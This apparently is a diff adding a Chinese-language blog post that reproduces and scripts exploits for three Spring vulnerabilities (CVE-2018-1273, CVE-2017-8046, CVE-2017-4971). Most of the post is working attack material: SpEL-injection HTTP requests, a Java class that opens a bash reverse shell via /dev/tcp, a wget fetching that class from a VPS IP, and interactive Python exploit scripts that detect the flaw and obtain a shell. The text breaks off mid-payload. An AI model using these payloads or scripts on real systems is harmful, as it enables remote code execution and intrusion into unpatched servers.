@@ -231,6 +231,255 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/04/spring%E7%B3%BB%E5%88%97cve-poc%E7%BC%96%E5%86%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是GG还是MM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/10/04/spring%E7%B3%BB%E5%88%97cve-poc%E7%BC%96%E5%86%99/" itemprop="url">spring系列cve poc编写</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-04T01:57:36+08:00">
+                2021-10-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p><em>本来是自己写在有道云笔记的，存粹是为了练习下python代码，也懒得打码了就是自己搭建的个漏测环境(<em>现在服务器已经被删除</em>)</em></p>
+</blockquote>
+<h3 id="0x01-cve-2018-1273"><a href="#0x01-cve-2018-1273" class="headerlink" title="0x01 cve-2018-1273"></a>0x01 cve-2018-1273</h3><h6 id="1-1-漏洞检测"><a href="#1-1-漏洞检测" class="headerlink" title="1.1 漏洞检测"></a>1.1 漏洞检测</h6><p>访问目标<code>/users?page=&amp;size=5</code></p>
+<p><img src="/2021/10/04/spring%E7%B3%BB%E5%88%97cve-poc%E7%BC%96%E5%86%99/spring%5C1.png" alt="1"></p>
+<p>抓包，修改post包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /users?page=&amp;size=5 HTTP/1.1</span><br><span class="line">Host: 49.235.54.135:24814</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 121</span><br><span class="line">Origin: http://49.235.54.135:24814</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://49.235.54.135:24814//users</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch root/test&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/04/spring%E7%B3%BB%E5%88%97cve-poc%E7%BC%96%E5%86%99/spring%5C2.png"></p>
+<p>进入docker查看是否创建成功</p>
+<p><img src="/2021/10/04/spring%E7%B3%BB%E5%88%97cve-poc%E7%BC%96%E5%86%99/spring%5C3.png"></p>
+<h6 id="1-2-反弹shell"><a href="#1-2-反弹shell" class="headerlink" title="1.2 反弹shell"></a>1.2 反弹shell</h6><p>这里我们先编译一个class文件</p>
+<p>Exploit.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/目标IP/2222 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后反编译下java文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>
+
+<p>然后再vps上传class文件再开启web</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p>然后再bp里面执行下载该class文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /users?page=&amp;size=5 HTTP/1.1</span><br><span class="line">Host: 49.235.54.135:24814</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 149</span><br><span class="line">Origin: http://49.235.54.135:24814</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://49.235.54.135:24814//users</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;wget http://198.13.51.45:8080/Exploit.class&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure>
+
+<p>然后我们再vps上面监听2222端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2222</span><br></pre></td></tr></table></figure>
+
+<p>然后再bp执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /users?page=&amp;size=5 HTTP/1.1</span><br><span class="line">Host: 49.235.54.135:24814</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line">Origin: http://49.235.54.135:24814</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://49.235.54.135:24814//users</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;java Exploit&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell成功<br><img src="/2021/10/04/spring%E7%B3%BB%E5%88%97cve-poc%E7%BC%96%E5%86%99/spring%5C4.png"></p>
+<h6 id="1-3-cve-2018-1273-poc编写"><a href="#1-3-cve-2018-1273-poc编写" class="headerlink" title="1.3 cve-2018-1273 poc编写"></a>1.3 cve-2018-1273 poc编写</h6><p>Spring在自动解析用户参数时候使用了<code>SpelExpressionParser</code> 来解析<code>propertyName</code></p>
+<p>MapDataBinder.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line">PropertyPath leafProperty = getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">TypeInformation&lt;?&gt; propertyType = owningType.getProperty(leafProperty.getSegment());</span><br><span class="line">propertyType = propertyName.endsWith(&quot;]&quot;) ? propertyType.getActualType() : propertyType;</span><br><span class="line">if (conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line">  PropertyDescriptor descriptor = BeanUtils</span><br><span class="line">      .getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());</span><br><span class="line">  MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);</span><br><span class="line">  TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);</span><br><span class="line">  value = conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">&#125;</span><br><span class="line">expression.setValue(context, value);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><figcaption><span>```setPropertyValue ```方法来，最后在 ```expression.setValue(context, value)``` 的时候触发了漏洞</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**使用说明**</span><br><span class="line"></span><br><span class="line">准备好class文件</span><br><span class="line"></span><br><span class="line">Exploit.java</span><br></pre></td></tr></table></figure>
+<p>public class Exploit{<br>    public Exploit(){<br>        try{<br>            Runtime.getRuntime().exec(“/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/目标IP/2222 0&gt;&amp;1”);<br>        }catch(Exception e){<br>            e.printStackTrace();<br>        }<br>    }<br>    public static void main(String[] argv){<br>        Exploit e = new Exploit();<br>    }<br>}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后反编译下java文件</span><br></pre></td></tr></table></figure>
+<p>javac Exploit.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后再vps上传class文件再开启web</span><br></pre></td></tr></table></figure>
+<p>python3 -m http.server 8080</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">这里url为```http://198.13.51.45:8080/Exploit.class```</span><br><span class="line">![](spring\5.png)</span><br><span class="line"></span><br><span class="line">vps监听，这里监听端口为编译的class的端口</span><br><span class="line">![](spring\6.png)</span><br><span class="line"></span><br><span class="line">![](spring\7.png)</span><br><span class="line"></span><br><span class="line">![](spring\8.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>import pyfiglet<br>import requests<br>ascii_banner = pyfiglet.figlet_format(“CVE-2018-1273”)<br>print(ascii_banner)<br>print(“blog:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yicunyiye/&quot;">https://www.cnblogs.com/yicunyiye/&quot;</a>)<br>print(“-“ * 50)<br>payload_poc = {<br>    ‘username[#this.getClass().forName(“java.lang.Runtime”).getRuntime().exec(“touch root/test111”)]’:’’,<br>    ‘password’:’’,<br>    ‘repeatedPassword’:’’<br>}</p>
+<p>url = input(“attack url:”)<br>print(“-“ * 50)</p>
+<h1 id="url-“http-49-235-54-135-24814-users-page-amp-size-5-quot"><a href="#url-“http-49-235-54-135-24814-users-page-amp-size-5-quot" class="headerlink" title="url = “http://49.235.54.135:24814//users?page=&amp;size=5&quot;"></a>url = “<a target="_blank" rel="noopener" href="http://49.235.54.135:24814//users?page=&amp;size=5&quot;">http://49.235.54.135:24814//users?page=&amp;size=5&quot;</a></h1><p>target = url+ “/users?page=&amp;size=5”<br>try:<br>    res = requests.post(target,data=payload_poc)<br>    if(res.status_code == 500):<br>        print(“[+]%s is vulnerable” % url)<br>        print(“-“ * 50)<br>        class_url = input(“your exp class url:”)<br>        cmd = “wget “+class_url<br>        payload_class = {<br>            ‘username[#this.getClass().forName(“java.lang.Runtime”).getRuntime().exec(“‘ +cmd+ ‘“)]’: ‘’,<br>            ‘password’: ‘’,<br>            ‘repeatedPassword’: ‘’<br>        }<br>        res_upload = requests.post(target,data=payload_class)<br>        if(res_upload.status_code == 500):<br>            print(“[+]upload success”)<br>            print(“-“ * 50)<br>            print(“在vps监听端口，执行之后输入1继续，否则跳出程序”)<br>            flag = input(“请在监听后输入1:”)<br>            print(“-“ * 50)<br>            flag = int(flag)<br>            if(flag == 1):<br>                payload_shell = {<br>                    ‘username[#this.getClass().forName(“java.lang.Runtime”).getRuntime().exec(“java Exploit”)]’: ‘’,<br>                    ‘password’: ‘’,<br>                    ‘repeatedPassword’: ‘’<br>                }<br>                res_shell = requests.post(target,data=payload_shell)<br>                if(res_shell.status_code == 500):<br>                    print(“[+]反弹成功”)<br>                else:<br>                    print(“[-]反弹失败”)<br>            else:<br>                exit(0)<br>        else:<br>            print(“[-]upload fail”)<br>            print(“-“ * 50)<br>    else:<br>        print(“[-]%s is not vulnerable” % url)<br>except:<br>    print(“[-]%s is not vulnerable” % url)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 0x02 CVE-2017-8046</span><br><span class="line"></span><br><span class="line">###### 2.1 漏洞复现</span><br><span class="line"></span><br><span class="line">访问存在漏洞web</span><br><span class="line">![](spring\9.png)</span><br><span class="line"></span><br><span class="line">访问/persons目录</span><br><span class="line">![](spring\10.png)</span><br><span class="line"></span><br><span class="line">post添加一个用户</span><br></pre></td></tr></table></figure>
+<p>{“firstName”:”test”,”lastName”:”test”}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![](spring\11.png)</span><br><span class="line"></span><br><span class="line">![](spring\12.png)</span><br><span class="line"></span><br><span class="line">可以看到id为1，在persons目录里面，使用PATCH方法尝试修改```lastName```</span><br><span class="line">在http头里面添加</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Content-Type’: ‘application/json-patch+json</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATCH修改内容为</span><br></pre></td></tr></table></figure>
+<p>[{“op”:”replace”,”path”:”/lastName”,”value”:”hacker”}]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">![](spring\13.png)</span><br><span class="line"></span><br><span class="line">可以看到修改成功</span><br><span class="line"></span><br><span class="line">如果要执行命令，需要转化为二进制执行,例如使用如下python代码：</span><br></pre></td></tr></table></figure>
+<p>cmd = input(“please input your command：”)<br>cmd = bytes(cmd, encoding=’utf-8’)<br>bytecode = ‘,’.join(str(i) for i in list(cmd))</p>
+<p>please input your command：touch /test<br>116,111,117,99,104,32,47,116,101,115,116</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后使用exp：</span><br></pre></td></tr></table></figure>
+<p>[{ “op”: “replace”, “path”: “T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,101,115,116}))/lastname”, “value”: “vulhub” }]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">![](spring\14.png)</span><br><span class="line"></span><br><span class="line">![](spring\15.png)</span><br><span class="line"></span><br><span class="line">执行成功</span><br><span class="line"></span><br><span class="line">反弹shell查看python代码，同样的操作，只是需要进行一个base64 bash编码</span><br><span class="line"></span><br><span class="line">###### 2.2 CVE-2017-8046 编写poc</span><br><span class="line"></span><br><span class="line">这里输入获取到的url地址</span><br><span class="line"></span><br><span class="line">![](spring\16.png)</span><br><span class="line"></span><br><span class="line">![](spring\17.png)</span><br><span class="line"></span><br><span class="line">![](spring\18.png)</span><br><span class="line"></span><br><span class="line">在vps监听</span><br><span class="line">![](spring\19.png)</span><br><span class="line"></span><br><span class="line">在exp输入shell</span><br><span class="line">![](spring\20.png)</span><br><span class="line"></span><br><span class="line">![](spring\21.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>import requests<br>import json<br>import pyfiglet<br>import base64<br>import time<br>import re</p>
+<p>ascii_banner = pyfiglet.figlet_format(“CVE-2017-8046”)<br>print(ascii_banner)<br>print(“blog:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yicunyiye/&quot;">https://www.cnblogs.com/yicunyiye/&quot;</a>)<br>print(“-“ * 50)</p>
+<p>url = input(“attack url:”)<br>resp_url = requests.get(url)<br>target_text = resp_url.text<br>print(“-“ * 50)<br>re_target = re.compile(‘“href” : “(.*?)”‘,re.I|re.S)<br>target = re_target.findall(target_text)[0]<br>once = requests.get(target)<br>once = once.text<br>print(once)<br>print(“-“ * 50)<br>print(“输入json中任意两个键来创建值，比如firstname，lastname”)<br>first = input(“first:”)<br>second = input(“second:”)</p>
+<h1 id="first-“lastname”"><a href="#first-“lastname”" class="headerlink" title="first = “lastname”"></a>first = “lastname”</h1><h1 id="second-“firstname”"><a href="#second-“firstname”" class="headerlink" title="second = “firstname”"></a>second = “firstname”</h1><p>create = {<br>    first:”yicunyiye”,<br>    second:”hacker”<br>}<br>if(‘hacker’ not in once):<br>    poc1 = requests.post(target,json=create)<br>once = requests.get(target)<br>once = once.text<br>time.sleep(2)<br>print(“-“ * 50)<br>#匹配创建的用户信息的url地址<br>re_target_once = re.compile(‘“hacker”(.*?)”profile”‘,re.I|re.S)<br>result_once = re_target_once.findall(once)<br>result_once = result_once[0]</p>
+<h1 id="input-“111-”"><a href="#input-“111-”" class="headerlink" title="input(“111:”)"></a>input(“111:”)</h1><p>re_target_twice = re.compile(‘“href” : “(.*?)”‘,re.I|re.S)<br>result_twice = re_target_twice.findall(result_once)<br>json_url = result_twice[0]</p>
+<h1 id="json-url-input-“输入json中的href地址：”"><a href="#json-url-input-“输入json中的href地址：”" class="headerlink" title="json_url = input(“输入json中的href地址：”)"></a>json_url = input(“输入json中的href地址：”)</h1><h1 id="json-url-“http-49-235-54-135-47507-persons-1-quot"><a href="#json-url-“http-49-235-54-135-47507-persons-1-quot" class="headerlink" title="json_url = “http://49.235.54.135:47507/persons/1&quot;"></a>json_url = “<a target="_blank" rel="noopener" href="http://49.235.54.135:47507/persons/1&quot;">http://49.235.54.135:47507/persons/1&quot;</a></h1><p>replace_url = requests.patch(json_url,<br>                     data=json.dumps([{“op”: “replace”, “path”: “/“+first+””, “value”: “fenghuaxueyue”}]),<br>                     headers={‘Content-Type’: ‘application/json-patch+json’})<br>replace_url = replace_url.text<br>if(‘fenghuaxueyue’ in replace_url):<br>    print(“[+]%s is vulnerable” % url)<br>print(“-“ * 50)<br>print(“input exit will break,input shell you can get a shell”)</p>
+<h1 id="cmd-“touch-tmp-test”"><a href="#cmd-“touch-tmp-test”" class="headerlink" title="cmd = “touch /tmp/test”"></a>cmd = “touch /tmp/test”</h1><h1 id="print-“please-input-your-command：”-cmd"><a href="#print-“please-input-your-command：”-cmd" class="headerlink" title="print(“please input your command：”+cmd)"></a>print(“please input your command：”+cmd)</h1><p>while True:<br>    cmd = input(“please input your command：”)<br>    cmd = bytes(cmd, encoding=’utf-8’)<br>    flag = b’exit’<br>    if cmd == flag:<br>        print(“bye~~”)<br>        break<br>    bytecode = ‘,’.join(str(i) for i in list(cmd))<br>    exp_url = requests.patch(json_url,<br>                         data=json.dumps([{ “op”: “replace”, “path”: “T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{“+bytecode+”}))/lastname”, “value”: “yicunyiye” }]),<br>                         headers={‘Content-Type’: ‘application/json-patch+json’})</p>
+<pre><code>if cmd == b&#39;shell&#39;:
+    reverse_ip = input(&#39;reverse ip：&#39;)
+    reverse_port = input(&#39;reverse port：&#39;)
+    bash_cmd = &quot;bash -i &gt;&amp; /dev/tcp/&quot; + reverse_ip + &quot;/&quot;+reverse_port+&quot; 0&gt;&amp;1&quot;
+    base64_cmd = base64.b64encode(bytes(bash_cmd, encoding=&#39;utf-8&#39;))
+    string_bash = str(base64_cmd,&#39;utf-8&#39;)
+    reverse_cmd = &quot;bash -c &#123;echo,&quot; + string_bash + &quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;
+    poc = bytes(reverse_cmd, encoding=&#39;utf-8&#39;)
+    poc_code = &#39;,&#39;.join(str(i) for i in list(poc))
+    exp = requests.patch(json_url,
+                             data=json.dumps([&#123;&quot;op&quot;: &quot;replace&quot;,
+                                               &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;&quot; + poc_code + &quot;&#125;))/lastname&quot;,
+                                               &quot;value&quot;: &quot;vulhub&quot;&#125;]),
+                             headers=&#123;&#39;Content-Type&#39;: &#39;application/json-patch+json&#39;&#125;)
+    print(&quot;[+]getshell success&quot;)
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 0x03 cve-2017-4971</span><br><span class="line"></span><br><span class="line">###### 3.1 漏洞复现</span><br><span class="line"></span><br><span class="line">使用左边账号登录</span><br><span class="line">![](spring\22.png)</span><br><span class="line"></span><br><span class="line">进去了访问/hotels/1</span><br><span class="line">![](spring\23.png)</span><br><span class="line"></span><br><span class="line">随便输入信息然后点击</span><br><span class="line">![](https://img2020.cnblogs.com/blog/2147685/202101/2147685-20210121193750728-157841489.png)</span><br><span class="line"></span><br><span class="line">![](spring\24.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">添加payload</span><br></pre></td></tr></table></figure>
+<p>&amp;_(new+java.lang.ProcessBuilder(“bash”,”-c”,”bash+-i+&gt;%26+/dev/tcp/攻击机IP/端口号+0&gt;%261”)).start()=yicunyiye</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](spring\25.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###### 3.2 cve-2017-4971 poc编写</span><br><span class="line"></span><br><span class="line">这里需要注意下就是登录以及后面的post数据包都采用了csrf_token，只需要用request.Session()固定下就，然后post前先get url 正则匹配下token就行了</span><br><span class="line"></span><br><span class="line">注意python编译器把空格变成+，我就在这里搞了好久--，结果发现被转义了</span><br><span class="line"></span><br><span class="line">![](spring\26.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](spring\27.png)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>import requests<br>import re<br>import time<br>import pyfiglet<br>import datetime</p>
+<p>ascii_banner = pyfiglet.figlet_format(“CVE-2017-4971”)<br>print(ascii_banner)<br>print(“blog:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yicunyiye/&quot;">https://www.cnblogs.com/yicunyiye/&quot;</a>)<br>print(“-“ * 50)</p>
+<p>#用户登录时候的url</p>
+<h1 id="url-input-“attack-url：”"><a href="#url-input-“attack-url：”" class="headerlink" title="url = input(“attack url：”)"></a>url = input(“attack url：”)</h1><p>url = “<a target="_blank" rel="noopener" href="http://49.235.54.135:24924/&quot;">http://49.235.54.135:24924/&quot;</a><br>print(“-“ * 50)<br>Post_login_url = url + “/loginProcess”<br>#输入账号密码<br>print(“default:keith,erwin,jeremy,scott”)</p>
+<h1 id="username-input-“username-”"><a href="#username-input-“username-”" class="headerlink" title="username = input(“username:”)"></a>username = input(“username:”)</h1><p>username = “keith”<br>print(“default:melbourne,leuven,atlanta,rochester”)</p>
+<h1 id="password-input-“password-”"><a href="#password-input-“password-”" class="headerlink" title="password = input(“password:”)"></a>password = input(“password:”)</h1><p>password = “melbourne”</p>
+<p>#用户登录时候需要的csrf_token<br>session = requests.Session()<br>login_csrf_url = url + ‘/login’<br>res_login = session.get(login_csrf_url)<br>re_login_csrf = re.compile(‘name=”_csrf” value=”(.*?)”‘,re.I|re.S)<br>login_token = re_login_csrf.findall(res_login.text)[0]<br>#登录<br>login_data = {<br>    “username”:username,<br>    “password”:password,<br>    “_csrf”:login_token<br>}</p>
+<p>login = session.post(Post_login_url,data=login_data,allow_redirects=False)<br>try:<br>    login_flag = str(login.headers)<br>    if(‘JSESSIONID’ in login_flag):<br>        print(“-“ * 50)<br>        print(“[+]login success!”)<br>        print(“-“ * 50)<br>        response = session.get(url+’/hotels/1’)<br>        Location = session.get(url+’/hotels/booking?hotelId=1’,allow_redirects=False)<br>        Location = Location.headers[‘Location’]<br>        #填写hotel信息的url<br>        hotel_info_url = url+Location<br>        hotel_page = session.get(hotel_info_url)<br>        re_post_csrf = re.compile(‘name=”_csrf” value=”(.*?)”‘, re.I | re.S)<br>        post_token = re_post_csrf.findall(hotel_page.text)[0]<br>        today_add_1 = (datetime.datetime.now() + datetime.timedelta(days=1)).strftime(“%m-%d-%Y”)<br>        today_reduce_1 = (datetime.datetime.now() + datetime.timedelta(days=-1)).strftime(“%m-%d-%Y”)<br>        today_add_3 = (datetime.datetime.now() + datetime.timedelta(days=3)).strftime(“%m-%d-%Y”)<br>        post_data = {<br>            “checkinDate”: today_add_1,<br>            “checkoutDate”: today_add_1,<br>            “beds”: “1”,<br>            “smoking”: “false”,<br>            “_amenities”: “on”,<br>            “_amenities”: “on”,<br>            “_amenities”: “on”,<br>            “creditCard”: “1231111111111111”,<br>            “creditCardName”: “11”,<br>            “creditCardExpiryMonth”: “1”,<br>            “creditCardExpiryYear”: “1”,<br>            “_csrf”: post_token,<br>            “_eventId_proceed”: “_eventId_proceed”,<br>            “ajaxSource”: “proceed”<br>        }<br>        Spring_Redirec_URL = session.post(hotel_info_url,data=post_data)<br>        Spring_Redirec_URL = Spring_Redirec_URL.headers[‘Spring-Redirect-URL’]<br>        confirm_url = url + Spring_Redirec_URL<br>        # res = session.get(confirm_url)<br>        reverse_ip = input(“reverse ip:”)<br>        reverse_port = input(“reverse port:”)<br>        confirm_data = {<br>            ‘_eventId_confirm’:’’,<br>            ‘<em>csrf’:post_token,<br>            ‘</em>(new java.lang.ProcessBuilder(“bash”,”-c”,”bash -i 